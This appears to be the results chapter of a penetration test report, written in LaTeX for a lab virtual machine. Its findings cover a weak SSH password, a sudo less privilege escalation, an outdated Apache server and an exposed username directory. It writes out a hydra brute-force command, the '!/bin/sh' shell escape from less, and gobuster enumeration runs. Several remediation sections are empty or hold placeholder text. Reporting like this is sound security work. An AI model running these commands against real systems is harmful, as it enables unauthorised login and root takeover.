\chapter{Results}
In this chapter, the vulnerabilities found during the penetration test are presented in detail. All issues are grouped by their target and contain the following information:
\begin{itemize}
	\item Brief description.
	\item CVSS Base Score -- see \href{https://www.first.org/cvss/user-guide}{\textcolor{blue}{\underline{here}}} for details.
	\item Exploitability -- describes the likelihood of an issue being used against customer's infrastructure.
	\item References to classifications: WASC, OWASP, CWE.
	\item Steps to reproduce.
\end{itemize}

Furthermore, recommendations for remediation are given for each vulnerability found during the penetration test. Both "quick win" and long-term solutions are presented as well as some code examples.

\section{Virtual Machine}
\textbf{Server IPv4 address}: 10.1.0.10\\
\textbf{Server IPv6 address}: fd01::a

\subsection{Weak password} \label{ss: issue-1}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & The user bluey uses a weak password and which can be brute-forced using common wordlists. \\
		\hline 
		CVSS Base Score & 9.1 \\
		\hline 
		Exploitablity & High \\
		\hline 
		\multirow{2}{*}{References to classifications} & WASC \\
		\cline{2-2} 
		& OWASP \\
		\hline 
		Affected input & hydra -l bluey -P rockyou.txt -t 4 10.1.0.10 ssh \\
		\hline 
	\end{tabular}
	\caption{Issue \#1: Weak password on Virtual Machine}
	\label{tbl:issue-1}
\end{table}

\subsubsection{Minimal proof of concept}
A currated list of users can be found on the Apache web server \ref{}.
Through the port scan it is reveald the SSH port is open.
Using hydra as a tool to brute-force the password of an user:
\begin{verbatim}
$ hydra -l bluey -P rockyou.txt -t 4 10.1.0.10 ssh
\end{verbatim}

\subsubsection{Proposed solutions} \label{solution: issue-2}
Use passwordless SSH authentication and dissable password authentication

\subsection{Privilege Escalation} \label{ss: issue-2}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & The user bluey is able to read a log file using \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} with root privilege. \\
		\hline 
		CVSS Base Score & 7.3 \\
		\hline 
		Exploitablity & High \\
		\hline 
		References to classifications & A01:2021 - Broken Access Control\\
		\hline 
	\end{tabular}
	\caption{Issue \#2}
	\label{tbl:issue-2}
\end{table}

\subsubsection{Minimal proof of concept}
Using the gained user account in \ref{ss: issue-1} we can look into the \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|etc/sudoers|} file and we find the following line:
\begin{verbatim}
	bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log
\end{verbatim}
This reveals the user bluey has root privileges to use \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} on the \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|/var/log/auth.log|} file. This poses a huge vulnerability because \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} allows a user to run commands inside the tool. 
If we execute:
\begin{verbatim}
	!/bin/sh
\end{verbatim}
we start a new shell instance with root privileges since less is running with root privileges.

\subsubsection{Proposed solutions} \label{solution: issue-3}


\section{Apache web server}
Apache web server using v.2.4.51\\
Web server is not configured\\
\textbf{Hostname \& Port}: 10.1.0.10:80\\

\subsection{} \label{ss: issue-4}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & Web server is vulnerable and outdated \\
		\hline 
		CVSS Base Score & 7.5 \\
		\hline 
		Exploitablity & Medium \\
		\hline 
		References to classifications & OWASP: A06:2021-Vulnerable and Outdated Components \\
		\hline
	\end{tabular}
	\caption{Issue \#3}
	\label{tbl:issue-3}
\end{table}

\subsubsection{Minimal proof of concept}
The web server is featuring the version 2.4.51 which has the following CVE entry:\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44790}

Basically, the webserver is vulnerable to a buffer overflow, if a request body is well crafted.

\subsubsection{Proposed solutions} \label{solution: issue-5}
Upgrade the web server to newest version.
Since the web server is not configured and in use we recommend to turn it offline as well. This would also mitigate the following finding. 

\subsection{Information Disclosure} \label{ss: issue-4}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & Web server exposes usernames \\
		\hline 
		CVSS Base Score & 6.5 \\
		\hline 
		Exploitablity & Medium \\
		\hline 
		References to classifications & OWASP: A3:2017-Sensitive Data Exposure \\
		\hline
	\end{tabular}
	\caption{Issue \#4}
	\label{tbl:issue-4}
\end{table}

\subsubsection{Minimal proof of concept}
To find all subdomains of the web server we ran gobuster:

\begin{verbatim}
$ gobuster dir -u 10.1.0.10:80 -w /wordlists/dirbig.txt
\end{verbatim}
\vdots
\begin{verbatim}
===============================================================
//                    (Status: 200) [Size: 10701]
/home                 (Status: 301) [Size: 305] [--> http://10.1.0.10/home/]

===============================================================
\end{verbatim}
\vdots

Opening \url{10.1.0.10:80/home} in the browser reveals three potential usernames:
\begin{itemize}
	\item root
	\item bluey
	\item bingo
\end{itemize}

Each user is the label of a directory and we ran another subdomain enumeration per user:

\begin{verbatim}
	$ gobuster dir -u 10.1.0.10/home -w wordlists/file+dir.txt
\end{verbatim}
\vdots
\begin{verbatim}
	===============================================================
/root                 (Status: 301) [Size: 310] [--> http://10.1.0.10/home/root/]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswds           (Status: 403) [Size: 274]

===============================================================
\end{verbatim}
\vdots

as seen in the output the files that return are forbidden.

\subsubsection{Proposed solutions} \label{solution: issue-4}
Proposed solution to the issue goes here.

\newpage